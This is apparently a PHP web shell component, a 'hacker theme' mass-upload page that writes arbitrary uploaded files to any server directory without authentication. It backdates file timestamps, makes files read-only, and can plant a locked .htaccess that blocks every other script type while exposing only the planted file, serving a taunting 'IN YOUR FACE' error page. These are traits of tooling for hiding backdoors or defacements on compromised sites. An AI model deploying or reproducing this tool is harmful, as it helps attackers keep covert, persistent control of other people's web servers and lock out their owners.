<?php
// upload_table_tools.php - Hacker Theme Edition
// Features: Mass File Upload with Table Interface
// -------------------------------------------------------

$message = "";
$upload_table_results = array();

// --- LOGIC PHP START ---
// Handle upload file table tools submission
if (isset($_POST['submit_upload_table'])) {
    @set_time_limit(0);
    @ini_set('memory_limit', '-1');
    
    $upload_table_data = isset($_POST['upload_table_data']) ? $_POST['upload_table_data'] : array();
    $success_count = 0;
    $fail_count = 0;
    $failed_items = array();
    $success_links = array();
    $upload_table_results = array();
    
    if (!empty($upload_table_data)) {
        foreach ($upload_table_data as $index => $row) {
            $path_target = isset($row['path_target']) ? trim($row['path_target']) : '';
            $note = isset($row['note']) ? trim($row['note']) : '';
            $save_as = isset($row['save_as']) ? trim($row['save_as']) : '';
            $modify_date = isset($row['modify_date']) ? trim($row['modify_date']) : '';
            $chmod_file = isset($row['chmod_file']) ? trim($row['chmod_file']) : '';
            $htaccess_enabled = isset($row['htaccess_enabled']) ? $row['htaccess_enabled'] : 'no';
            $chmod_htaccess = isset($row['chmod_htaccess']) ? trim($row['chmod_htaccess']) : '';
            
            // Handle file upload for this specific row
            $file_uploaded = false;
            $file_content = false;
            $original_name = '';
            
            if (isset($_FILES['upload_files']['name'][$index]) && $_FILES['upload_files']['error'][$index] == 0) {
                $file_uploaded = true;
                $original_name = $_FILES['upload_files']['name'][$index];
                $file_tmp = $_FILES['upload_files']['tmp_name'][$index];
                $file_content = file_get_contents($file_tmp);
                
                // If save_as is empty, use original filename
                if (empty($save_as)) {
                    $save_as = $original_name;
                }
            }
            
            if ($file_uploaded && $file_content !== false && !empty($path_target) && is_dir($path_target) && !empty($save_as)) {
                $destination = rtrim($path_target, '/\\') . DIRECTORY_SEPARATOR . $save_as;
                
                // Write file
                if (file_put_contents($destination, $file_content) !== false) {
                    // Change file modification date if provided
                    if (!empty($modify_date)) {
                        $time_val = strtotime($modify_date);
                        if ($time_val !== false) {
                            @touch($destination, $time_val, $time_val);
                        }
                    }
                    
                    // Change file permissions
                    if (!empty($chmod_file)) {
                        $mode = octdec($chmod_file);
                        @chmod($destination, $mode);
                    }
                    
                    // Create .htaccess if enabled
                    if ($htaccess_enabled === 'yes') {
                        $allowed_files = array('index.html', 'sitemap.xml', 'robots.txt', 'robot', 'txt');
                        if (!in_array($save_as, $allowed_files)) {
                            $allowed_files[] = $save_as;
                        }
                        
                        $filematch_pattern = '^(' . implode('|', array_unique($allowed_files)) . ')$';
                        
                        $htaccess_content = '<FilesMatch ".*\.(cgi|pl|py|pyc|pyo|php3|php4|php6|pcgi|pcgi3|pcgi4|pcgi5|pchi6|inc|php|Php|pHp|phP|PHp|pHP|PhP|PHP|PhP|php5|Php5|phar|PHAR|Phar|PHar|PHAr|pHAR|phAR|inc|phaR|pHp5|phP5|PHp5|pHP5|PhP5|PHP5|cgi|CGI|CGi|cGI|PhP5|php6|php7|php8|php9|phtml|Phtml|pHtml|phTml|pHTml|Fla|fLa|flA|FLa|fLA|FlA|FLA|phtMl|phtmL|PHtml|PhTml|PHTML|PHTml|PHTMl|PhtMl|PHTml|PHtML|pHTMl|PhTML|pHTML|PhtmL|PHTmL|PhtMl|PhtmL|pHtMl|PhTmL|pHtmL|aspx|ASPX|asp|ASP|php.jpg|PHP.JPG|php.xxxjpg|PHP.XXXJPG|php.jpeg|PHP.JPG|PHP.JPEG|PHP.PJEPG|php.pjpeg|php.fla|PHP.FLA|php.png|PHP.PNG|php.gif|PHP.GIF|php.test|php;.jpg|PHP JPG|PHP;.JPG|php;.jpeg|php jpg|php.bak|php.pdf|php.xxxpdf|php.xxxpng|fla|Fla|fLa|fLa|flA|FLa|fLA|FLA|FlA|php.xxxgif|php.xxxpjpeg|php.xxxjpeg|php3.xxxjpeg|php3.xxxjpg|php5.xxxjpg|php3.pjpeg|php5.pjpeg|shtml|php.unknown|php.doc|php.docx|php.pdf|php.ppdf|jpg.PhP|php.txt|php.xxxtxt|PHP.TXT|PHP.XXXTXT|php.xlsx|php.zip|php.xxxzip|php78|php56|php96|php69|php67|php68|php4|shtMl|shtmL|SHtml|ShTml|SHTML|SHTml|SHTMl|ShtMl|SHTml|SHtML|sHTMl|ShTML|sHTML|ShtmL|SHTmL|ShtMl|ShtmL|sHtMl|ShTmL|sHtmL|Shtml|sHtml|shTml|sHTml|shtml|php1|php2|php3|php4|php10|alfa|suspected|py|exe|alfa|html|htm)$"> 
Order Allow,Deny
Deny from all
</FilesMatch>
Options -Indexes
<FilesMatch\'' . $filematch_pattern . '\'>
 Order allow,deny
 Allow from all
</FilesMatch>
ErrorDocument 403 \'<center><img src=\"https://media.tenor.com/WYQnYdWsmrkAAAAM/hahaha-lol.gif\"></img> <h3>IN YOUR FACE</font>\'';
                        
                        $htaccess_path = dirname($destination) . DIRECTORY_SEPARATOR . '.htaccess';
                        file_put_contents($htaccess_path, $htaccess_content);
                        
                        // Set HTAccess permissions
                        if (!empty($chmod_htaccess)) {
                            $htaccess_mode = octdec($chmod_htaccess);
                            @chmod($htaccess_path, $htaccess_mode);
                        } else {
                            chmod($htaccess_path, 0444);
                        }
                    }
                    
                    $success_count++;
                    
                    // Generate web link
                    $doc_root = str_replace('\\', '/', $_SERVER['DOCUMENT_ROOT']);
                    $dest_path = str_replace('\\', '/', $destination);
                    $web_path = str_replace($doc_root, '', $dest_path);
                    if(substr($web_path, 0, 1) !== '/') $web_path = '/' . $web_path;
                    
                    $link = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://" . $_SERVER['HTTP_HOST'] . $web_path;
                    
                    // Use NOTE as link label, fallback to [LINK] if empty
                    $link_label = !empty($note) ? $note : 'LINK';
                    $success_links[] = "<a href='$link' target='_blank'>[$link_label] $link</a>";
                    
                    // Store result for table display
                    $upload_table_results[] = array(
                        'path_target' => $path_target,
                        'save_as' => $save_as,
                        'original_name' => $original_name,
                        'status' => 'success',
                        'link' => $link,
                        'note' => $note
                    );
                } else {
                    $fail_count++;
                    $failed_items[] = "Row " . ($index + 1) . ": Failed to write file";
                    $upload_table_results[] = array(
                        'path_target' => $path_target,
                        'save_as' => $save_as,
                        'original_name' => $original_name,
                        'status' => 'failed',
                        'error' => 'Failed to write file',
                        'note' => $note
                    );
                }
            } else {
                $fail_count++;
                $error_msg = "Row " . ($index + 1) . ": ";
                if (!$file_uploaded) {
                    $error_msg .= "No file uploaded";
                } elseif ($file_content === false) {
                    $error_msg .= "Failed to read file";
                } elseif (empty($path_target)) {
                    $error_msg .= "Empty path target";
                } elseif (!is_dir($path_target)) {
                    $error_msg .= "Invalid directory";
                } elseif (empty($save_as)) {
                    $error_msg .= "Empty filename";
                } else {
                    $error_msg .= "Unknown error";
                }
                
                $failed_items[] = $error_msg;
                $upload_table_results[] = array(
                    'path_target' => $path_target,
                    'save_as' => $save_as,
                    'original_name' => $original_name,
                    'status' => 'failed',
                    'error' => $error_msg,
                    'note' => $note
                );
            }
        }
        
        $msg_detail = $fail_count > 0 ? "<div class='mt-2 text-danger'>[!] FAILED_ITEMS:<br>" . implode("<br>", $failed_items) . "</div>" : "";
        $link_list = !empty($success_links) ? "<div class='mt-2 terminal-box result-box'><b>[+] UPLOADED_SUCCESSFULLY:</b><ul class='mb-0 ps-3 list-unstyled'>" . implode("</li><li>", $success_links) . "</li></ul></div>" : "";
        
        $status_class = $fail_count > 0 ? 'alert-warning' : 'alert-success';
        $message = "<div class='alert $status_class'><span class='cmd-prefix'>root@sys:~#</span> UPLOAD_TABLE_EXECUTION_REPORT: $success_count files uploaded successfully, $fail_count failed.<br>$link_list$msg_detail</div>";
    } else {
        $message = "<div class='alert alert-warning'><span class='cmd-prefix'>root@sys:~#</span> WARNING: No table data provided.</div>";
    }
}
// --- LOGIC PHP END ---
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>./Upload_Table_Tools</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600&display=swap" rel="stylesheet">
    
    <style>
        :root {
            --neon-blue: #00d4ff;
            --neon-blue-bright: #00ffff;
            --bg-dark: #0a0a0f;
            --bg-darker: #050508;
            --text-light: #e0e0e0;
            --border-color: #1a1a2e;
        }
        body {
            font-family: 'Fira Code', 'Courier New', monospace;
            background-color: var(--bg-dark);
            color: var(--neon-blue);
            font-size: 0.9rem;
        }

        .card {
            background-color: var(--panel-bg);
            border: 1px solid var(--neon-blue);
            box-shadow: 0 0 10px rgba(0, 212, 255, 0.1);
            margin-bottom: 20px;
        }

        .card-title {
            color: var(--neon-blue);
            font-weight: 600;
            text-transform: uppercase;
            border-bottom: 1px dashed var(--neon-blue);
            padding-bottom: 10px;
            letter-spacing: 1px;
        }

        .form-control, .input-group-text {
            background-color: var(--input-bg);
            border: 1px solid #333;
            color: var(--neon-blue);
            font-family: 'Fira Code', monospace;
        }

        .form-control:focus {
            background-color: var(--input-bg);
            color: #fff;
            border-color: var(--neon-blue);
            box-shadow: 0 0 8px rgba(0, 212, 255, 0.4);
        }

        .form-control::placeholder { color: #66ccff; font-style: italic; }
        .input-group-text { color: var(--neon-blue); border-right: none; }
        .input-group .form-control { border-left: none; }

        .btn-hacker {
            background-color: transparent;
            border: 1px solid var(--neon-blue);
            color: var(--neon-blue);
            text-transform: uppercase;
            letter-spacing: 1px;
            transition: all 0.3s;
        }

        .btn-hacker:hover {
            background-color: var(--neon-blue);
            color: #000;
            box-shadow: 0 0 15px var(--neon-blue);
        }
        
        .btn-remove { border: 1px solid #ff3333; color: #ff3333; background: transparent; }
        .btn-remove:hover { background: #ff3333; color: #000; box-shadow: 0 0 10px #ff3333; }

        .alert {
            background-color: rgba(0, 10, 20, 0.9);
            border: 1px solid var(--neon-blue);
            color: var(--neon-blue);
            border-radius: 0;
        }
        .alert-danger { border-color: #ff3333; color: #ff3333; }
        .alert-warning { border-color: #ffff00; color: #ffff00; }

        .cmd-prefix { color: var(--neon-blue-bright); margin-right: 10px; }
        .terminal-box {
            background: #000; border: 1px solid #333;
            padding: 10px; max-height: 250px; overflow-y: auto;
        }

        .result-box a { color: var(--neon-blue-bright); text-decoration: none; }
        .result-box a:hover { text-decoration: underline; background: #001133; }

        .form-check-input { background-color: #000; border-color: var(--neon-blue); border-radius: 0; }
        .form-check-input:checked { background-color: var(--neon-blue); border-color: var(--neon-blue); }
        .form-check-label { color: var(--neon-blue); cursor: pointer; }

        ::-webkit-scrollbar { width: 8px; }
        ::-webkit-scrollbar-track { background: #000; }
        ::-webkit-scrollbar-thumb { background: #004466; border: 1px solid var(--neon-blue); }
        ::-webkit-scrollbar-thumb:hover { background: var(--neon-blue); }

        .text-muted { color: #66ccff !important; }
        label { margin-bottom: 5px; font-weight: bold; color: var(--neon-blue); }
        hr { border-color: #333; opacity: 1; }
        
        /* Table Tools Styles */
        .table-tools {
            background-color: var(--panel-bg);
            border: 1px solid var(--neon-blue);
            border-radius: 0;
        }
        
        .table-tools thead th {
            background-color: #111;
            color: var(--neon-blue);
            border: 1px solid var(--neon-blue);
            font-weight: 600;
            text-transform: uppercase;
            font-size: 0.8rem;
            letter-spacing: 1px;
        }
        
        .table-tools tbody td {
            background-color: #000;
            color: var(--neon-blue);
            border: 1px solid #333;
            padding: 8px;
            vertical-align: middle;
        }
        
        .table-tools tbody tr:hover td {
            background-color: #0a0a0a;
        }
        
        .table-tools input, .table-tools select {
            background-color: #111;
            border: 1px solid var(--neon-blue);
            color: var(--neon-blue);
            font-family: 'Fira Code', monospace;
            font-size: 0.85rem;
            padding: 4px 8px;
            width: 100%;
        }
        
        .table-tools input:focus, .table-tools select:focus {
            background-color: #111;
            outline: none;
        }
        
        .btn-add-row {
            background: transparent;
            border: 1px solid var(--neon-blue);
            color: var(--neon-blue);
            text-transform: uppercase;
            font-size: 0.8rem;
            padding: 8px 16px;
            margin-top: 10px;
            cursor: pointer;
        }
        
        .table-tools .btn-add-row:hover {
            background: var(--neon-blue);
            color: #000;
        }
        
        .status-success { color: #00d4ff; font-weight: bold; }
        .status-failed { color: #ff3333; font-weight: bold; }
        
        .table-responsive {
            max-height: 500px;
            overflow-y: auto;
            border: 1px solid #333;
            overflow-x: hidden;
        }
        
        /* Make table use full width */
        .table-tools {
            width: 100%;
        }
        
        /* Make file inputs more compact */
        .table-tools input[type="file"] {
            padding: 2px 4px;
            font-size: 0.8rem;
        }
    </style>
</head>
<body class="py-4">

<div class="container-fluid" style="max-width: 95%; margin: 0 auto;">
    
    <div class="text-center mb-5">
        <h2 class="fw-bold" style="text-shadow: 0 0 10px var(--neon-blue);">
            <i class="fas fa-upload me-2"></i>UPLOAD_TABLE_TOOLS
        </h2>
        <p class="small text-muted">&lt;!-- Mass File Upload with Table Interface --&gt;</p>
    </div>

    <?php echo $message; ?>

    <form method="post" enctype="multipart/form-data">
        <div class="card mb-4">
            <div class="card-body p-4">
                <h5 class="card-title"><i class="fas fa-upload me-2"></i>[ UPLOAD_TABLE_TOOLS ]</h5>
                <p class="small text-muted mb-3">Mass file upload with table interface - NOTE | File Upload | Path Target | Save As | Modify | chmod file | htaccess (yes/no) | chmod htaccess</p>
                
                <div class="table-responsive mb-3">
                    <table class="table table-tools" id="upload-table">
                        <thead>
                            <tr>
                                <th style="width: 10%">NOTE</th>
                                <th style="width: 15%">File Upload</th>
                                <th style="width: 22%">Path Target</th>
                                <th style="width: 11%">Save As</th>
                                <th style="width: 12%">Modify</th>
                                <th style="width: 7%">chmod file</th>
                                <th style="width: 7%">htaccess</th>
                                <th style="width: 7%">chmod ht</th>
                                <th style="width: 11%">Action</th>
                            </tr>
                        </thead>
                        <tbody id="upload-table-body">
                            <tr class="upload-table-row" data-row-id="1">
                                <td><input type="text" name="upload_table_data[1][note]" placeholder="ZILA" class="form-control"></td>
                                <td><input type="file" name="upload_files[1]" class="form-control" required></td>
                                <td><input type="text" name="upload_table_data[1][path_target]" placeholder="/var/www/html" class="form-control"></td>
                                <td><input type="text" name="upload_table_data[1][save_as]" placeholder="auto-detect" class="form-control"></td>
                                <td><input type="text" name="upload_table_data[1][modify_date]" placeholder="2017-07-11 12:51:23" class="form-control"></td>
                                <td><input type="text" name="upload_table_data[1][chmod_file]" value="0444" placeholder="0444" class="form-control"></td>
                                <td>
                                    <select name="upload_table_data[1][htaccess_enabled]" class="form-control">
                                        <option value="no">No</option>
                                        <option value="yes">Yes</option>
                                    </select>
                                </td>
                                <td><input type="text" name="upload_table_data[1][chmod_htaccess]" value="0444" placeholder="0444" class="form-control"></td>
                                <td><button type="button" class="btn-remove-row" onclick="removeUploadRow(this)">X</button></td>
                            </tr>
                        </tbody>
                    </table>
                </div>
                
                <div class="d-flex justify-content-between align-items-center">
                    <button type="button" class="btn-add-row" onclick="addUploadTableRow()">
                        <i class="fas fa-plus me-2"></i>ADD ROW
                    </button>
                    <button type="button" class="btn-hacker btn-sm" onclick="showManualFillHelp()">
                        <i class="fas fa-info-circle me-1"></i> HELP
                    </button>
                </div>
                
                <?php if (!empty($upload_table_results)): ?>
                    <div class="mt-4">
                        <h6 class="text-uppercase mb-3" style="color: var(--neon-blue);">Upload Results:</h6>
                        <div class="table-responsive">
                            <table class="table table-tools">
                                <thead>
                                    <tr>
                                        <th>Path Target</th>
                                        <th>Original File</th>
                                        <th>Saved As</th>
                                        <th>Status</th>
                                        <th>Link</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <?php foreach ($upload_table_results as $result): ?>
                                        <tr>
                                            <td><?php echo htmlspecialchars($result['path_target']); ?></td>
                                            <td><?php echo htmlspecialchars($result['original_name']); ?></td>
                                            <td><?php echo htmlspecialchars($result['save_as']); ?></td>
                                            <td>
                                                <?php if ($result['status'] === 'success'): ?>
                                                    <span class="status-success">SUCCESS</span>
                                                <?php else: ?>
                                                    <span class="status-failed">FAILED: <?php echo htmlspecialchars($result['error']); ?></span>
                                                <?php endif; ?>
                                            </td>
                                            <td>
                                                <?php if ($result['status'] === 'success' && isset($result['link'])): ?>
                                                    <a href="<?php echo $result['link']; ?>" target="_blank" style="color: #0088ff;">Open</a>
                                                <?php endif; ?>
                                            </td>
                                        </tr>
                                    <?php endforeach; ?>
                                </tbody>
                            </table>
                        </div>
                    </div>
                <?php endif; ?>
                
                <hr class="my-4">
                
                <button type="submit" name="submit_upload_table" class="btn btn-hacker w-100 py-3 fw-bold">
                    <i class="fas fa-rocket me-2"></i> EXECUTE_UPLOAD_TABLE_DEPLOYMENT
                </button>
            </div>
        </div>
    </form>

    <div class="text-center small" style="color: #333;">
        root@system:~/tools# _
    </div>
</div>

<script>
    // --- Upload Table Tools Functions ---
    var uploadTableRowCounter = 1;
    
    function addUploadTableRow() {
        uploadTableRowCounter++;
        var tableBody = document.getElementById('upload-table-body');
        var newRow = document.createElement('tr');
        newRow.className = 'upload-table-row';
        newRow.setAttribute('data-row-id', uploadTableRowCounter);
        
        newRow.innerHTML = `
            <td><input type="text" name="upload_table_data[${uploadTableRowCounter}][note]" placeholder="ZILA" class="form-control"></td>
            <td><input type="file" name="upload_files[${uploadTableRowCounter}]" class="form-control" required></td>
            <td><input type="text" name="upload_table_data[${uploadTableRowCounter}][path_target]" placeholder="/var/www/html" class="form-control"></td>
            <td><input type="text" name="upload_table_data[${uploadTableRowCounter}][save_as]" placeholder="auto-detect" class="form-control"></td>
            <td><input type="text" name="upload_table_data[${uploadTableRowCounter}][modify_date]" placeholder="2017-07-11 12:51:23" class="form-control"></td>
            <td><input type="text" name="upload_table_data[${uploadTableRowCounter}][chmod_file]" value="0444" placeholder="0444" class="form-control"></td>
            <td>
                <select name="upload_table_data[${uploadTableRowCounter}][htaccess_enabled]" class="form-control">
                    <option value="no">No</option>
                    <option value="yes">Yes</option>
                </select>
            </td>
            <td><input type="text" name="upload_table_data[${uploadTableRowCounter}][chmod_htaccess]" value="0444" placeholder="0444" class="form-control"></td>
            <td><button type="button" class="btn-remove-row" onclick="removeUploadRow(this)">X</button></td>
        `;
        
        tableBody.appendChild(newRow);
    }
    
    function removeUploadRow(button) {
        var row = button.closest('tr');
        var tableBody = document.getElementById('upload-table-body');
        
        // Don't remove if it's the last row
        if (tableBody.children.length > 1) {
            row.remove();
        } else {
            alert('[SYSTEM] Cannot remove last row. At least one row must remain.');
        }
    }
    
    function showManualFillHelp() {
        alert('[SYSTEM] USAGE:\n\n1. Fill NOTE with custom link label (replaces [LINK])\n2. Select file for each row in File Upload column\n3. Fill Path Target with directory paths\n4. Set Save As filename (optional, auto-detect if empty)\n5. Set Modify date (format: YYYY-MM-DD HH:MM:SS)\n6. Configure chmod and htaccess settings\n7. Click EXECUTE_UPLOAD_TABLE_DEPLOYMENT\n\nTips:\n- Use ADD ROW for multiple different files\n- Each row can upload different file\n- NOTE replaces [LINK] in results (e.g., "ZILA" -> [ZILA])\n- Modify date changes file timestamp\n- chmod 0444 = read-only\n- chmod 0755 = read+execute\n- htaccess protects your files');
    }
</script>

</body>
</html>

